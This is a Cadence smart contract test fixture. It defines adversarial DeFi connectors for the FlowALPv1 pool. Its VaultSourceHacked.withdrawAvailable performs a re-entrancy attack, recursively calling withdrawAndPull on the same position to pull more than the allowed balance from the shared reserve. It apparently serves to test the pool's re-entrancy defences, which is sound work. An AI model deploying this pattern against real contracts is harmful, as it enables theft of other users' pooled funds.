import "FungibleToken"
import "FungibleTokenMetadataViews"

import "DeFiActionsUtils"
import "DeFiActions"
import "FlowALPv1"

import "MOET"
import "FlowToken"

/// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
/// THIS IS A TESTING CONTRACT THAT SHOULD NOT BE USED IN PRODUCTION
/// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
///
/// AdversarialReentrancyConnectors
///
/// This contract holds malicious DeFi connectors which implement a re-entrancy attack.
/// When a user withdraws from their position, they can optionally pull from their configured top-up source to help fund the withdrawal.
/// This contract implements a malicious source which attempts to withdraw from the same position again
/// when it is asked to provide funds for the outer withdrawal.
/// If unaccounted for, this could allow an attacker to withdraw more than their available balance from the shared Pool reserve.
access(all) contract AdversarialReentrancyConnectors {

    /// VaultSink
    ///
    /// A DeFiActions connector that deposits tokens into a Vault
    ///
    access(all) struct VaultSinkHacked : DeFiActions.Sink {
        /// The Vault Type accepted by the Sink
        access(all) let depositVaultType: Type
        /// The maximum balance of the linked Vault, checked before executing a deposit
        access(all) let maximumBalance: UFix64
        /// An optional identifier allowing protocols to identify stacked connector operations by defining a protocol-
        /// specific Identifier to associated connectors on construction
        access(contract) var uniqueID: DeFiActions.UniqueIdentifier?
        /// An unentitled Capability on the Vault to which deposits are distributed
        access(self) let depositVault: Capability<&{FungibleToken.Vault}>

        init(
            max: UFix64?,
            depositVault: Capability<&{FungibleToken.Vault}>,
            uniqueID: DeFiActions.UniqueIdentifier?
        ) {
            pre {
                depositVault.check(): "Provided invalid Capability"
                DeFiActionsUtils.definingContractIsFungibleToken(depositVault.borrow()!.getType()):
                "The contract defining Vault \(depositVault.borrow()!.getType().identifier) does not conform to FungibleToken contract interface"
                (max ?? UFix64.max) > 0.0:
                "Maximum balance must be greater than 0.0 if provided"
            }
            self.maximumBalance = max ?? UFix64.max // assume no maximum if none provided
            self.uniqueID = uniqueID
            self.depositVaultType = depositVault.borrow()!.getType()
            self.depositVault = depositVault
        }

        /// Returns a ComponentInfo struct containing information about this VaultSink and its inner DFA components
        ///
        /// @return a ComponentInfo struct containing information about this component and a list of ComponentInfo for
        ///     each inner component in the stack.
        ///
        access(all) fun getComponentInfo(): DeFiActions.ComponentInfo {
            return DeFiActions.ComponentInfo(
                type: self.getType(),
                id: self.id(),
                innerComponents: []
            )
        }
        /// Returns a copy of the struct's UniqueIdentifier, used in extending a stack to identify another connector in
        /// a DeFiActions stack. See DeFiActions.align() for more information.
        ///
        /// @return a copy of the struct's UniqueIdentifier
        ///
        access(contract) view fun copyID(): DeFiActions.UniqueIdentifier? {
            return self.uniqueID
        }
        /// Sets the UniqueIdentifier of this component to the provided UniqueIdentifier, used in extending a stack to
        /// identify another connector in a DeFiActions stack. See DeFiActions.align() for more information.
        ///
        /// @param id: the UniqueIdentifier to set for this component
        ///
        access(contract) fun setID(_ id: DeFiActions.UniqueIdentifier?) {
            self.uniqueID = id
        }
        /// Returns the Vault type accepted by this Sink
        access(all) view fun getSinkType(): Type {
            return self.depositVaultType
        }
        /// Returns an estimate of how much of the associated Vault can be accepted by this Sink
        access(all) fun minimumCapacity(): UFix64 {
            if let vault = self.depositVault.borrow() {
                return vault.balance < self.maximumBalance ? self.maximumBalance - vault.balance : 0.0
            }
            return 0.0
        }
        /// Deposits up to the Sink's capacity from the provided Vault
        access(all) fun depositCapacity(from: auth(FungibleToken.Withdraw) &{FungibleToken.Vault}) {
            let minimumCapacity = self.minimumCapacity()
            if !self.depositVault.check() || minimumCapacity == 0.0 {
                return
            }
            // deposit the lesser of the originating vault balance and minimum capacity
            let capacity = minimumCapacity <= from.balance ? minimumCapacity : from.balance
            self.depositVault.borrow()!.deposit(from: <-from.withdraw(amount: capacity))
        }
    }

    access(all) resource LiveData {
        /// Optional: Pool capability for recursive withdrawAndPull call
        access(all) var recursivePool: Capability<auth(FlowALPv1.EPosition) &FlowALPv1.Pool>?
        /// Optional: Position ID for recursive withdrawAndPull call
        access(all) var recursivePositionID: UInt64?

        init() { self.recursivePositionID = nil; self.recursivePool = nil }
        access(all) fun setRecursivePool(_ pool: Capability<auth(FlowALPv1.EPosition) &FlowALPv1.Pool>) {
            self.recursivePool = pool
        }
        access(all) fun setRecursivePositionID(_ positionID: UInt64) {
            self.recursivePositionID = positionID
        }
    }
    access(all) fun createLiveData(): @LiveData {
        return <- create LiveData()
    }

    /// VaultSource
    ///
    /// A DeFiActions connector that withdraws tokens from a Vault
    ///
    access(all) struct VaultSourceHacked : DeFiActions.Source {
        /// Returns the Vault type provided by this Source
        access(all) let withdrawVaultType: Type
        /// The minimum balance of the linked Vault
        access(all) let minimumBalance: UFix64
        /// An optional identifier allowing protocols to identify stacked connector operations by defining a protocol-
        /// specific Identifier to associated connectors on construction
        access(contract) var uniqueID: DeFiActions.UniqueIdentifier?
        /// An entitled Capability on the Vault from which withdrawals are sourced
        access(self) let withdrawVault: Capability<auth(FungibleToken.Withdraw) &{FungibleToken.Vault}>

        access(all) let liveDataCap: Capability<&LiveData>

        init(
            min: UFix64?,
            withdrawVault: Capability<auth(FungibleToken.Withdraw) &{FungibleToken.Vault}>,
            uniqueID: DeFiActions.UniqueIdentifier?,
            liveDataCap: Capability<&LiveData>
        ) {
            pre {
                withdrawVault.check(): "Provided invalid Capability"
                DeFiActionsUtils.definingContractIsFungibleToken(withdrawVault.borrow()!.getType()):
                "The contract defining Vault \(withdrawVault.borrow()!.getType().identifier) does not conform to FungibleToken contract interface"
            }
            self.minimumBalance = min ?? 0.0 // assume no minimum if none provided
            self.withdrawVault = withdrawVault
            self.uniqueID = uniqueID
            self.withdrawVaultType = withdrawVault.borrow()!.getType()
            self.liveDataCap = liveDataCap
        }
        /// Returns a ComponentInfo struct containing information about this VaultSource and its inner DFA components
        ///
        /// @return a ComponentInfo struct containing information about this component and a list of ComponentInfo for
        ///     each inner component in the stack.
        ///
        access(all) fun getComponentInfo(): DeFiActions.ComponentInfo {
            return DeFiActions.ComponentInfo(
                type: self.getType(),
                id: self.id(),
                innerComponents: []
            )
        }
        /// Returns a copy of the struct's UniqueIdentifier, used in extending a stack to identify another connector in
        /// a DeFiActions stack. See DeFiActions.align() for more information.
        ///
        /// @return a copy of the struct's UniqueIdentifier
        ///
        access(contract) view fun copyID(): DeFiActions.UniqueIdentifier? {
            return self.uniqueID
        }
        /// Sets the UniqueIdentifier of this component to the provided UniqueIdentifier, used in extending a stack to
        /// identify another connector in a DeFiActions stack. See DeFiActions.align() for more information.
        ///
        /// @param id: the UniqueIdentifier to set for this component
        ///
        access(contract) fun setID(_ id: DeFiActions.UniqueIdentifier?) {
            self.uniqueID = id
        }
        /// Returns the Vault type provided by this Source
        access(all) view fun getSourceType(): Type {
            return self.withdrawVaultType
        }
        /// Returns an estimate of how much of the associated Vault can be provided by this Source
        access(all) fun minimumAvailable(): UFix64 {
            if let vault = self.withdrawVault.borrow() {
                return self.minimumBalance < vault.balance ? vault.balance - self.minimumBalance : 0.0
            }
            return 0.0
        }

        /// Withdraws the lesser of maxAmount or minimumAvailable(). If none is available, an empty Vault should be
        /// returned
        access(FungibleToken.Withdraw) fun withdrawAvailable(maxAmount: UFix64): @{FungibleToken.Vault} {
            // If recursive withdrawAndPull is configured, call it first
            log("VaultSource.withdrawAvailable called with maxAmount: \(maxAmount)")
            log("=====Recursive pool: \(self.liveDataCap.check())")
            let liveData = self.liveDataCap.borrow() ?? panic("cant borrow LiveData")
            let poolRef = liveData.recursivePool!.borrow() ?? panic("cant borrow Recursive pool is nil")
            // Call withdrawAndPull on the position
            let recursiveVault <- poolRef.withdrawAndPull(
                pid: liveData.recursivePositionID!,
                // type: Type<@MOET.Vault>(),
                type: Type<@FlowToken.Vault>(),
                // type: tokenType,
                amount: 900.0,
                pullFromTopUpSource: false
            )
            log("Recursive withdrawAndPull returned vault with balance: \(recursiveVault.balance)")
            // If we got funds from the recursive call, return them
            if recursiveVault.balance > 0.0 {
                return <-recursiveVault
            }
            // Otherwise, destroy the empty vault and continue with normal withdrawal
            destroy recursiveVault

            
            // Normal vault withdrawal
            let available = self.minimumAvailable()
            if !self.withdrawVault.check() || available == 0.0 || maxAmount == 0.0 {
                panic("Withdraw vault check failed")
            }
            // take the lesser between the available and maximum requested amount
            let withdrawalAmount = available <= maxAmount ? available : maxAmount;
            return <- self.withdrawVault.borrow()!.withdraw(amount: withdrawalAmount)
        }
    }
}
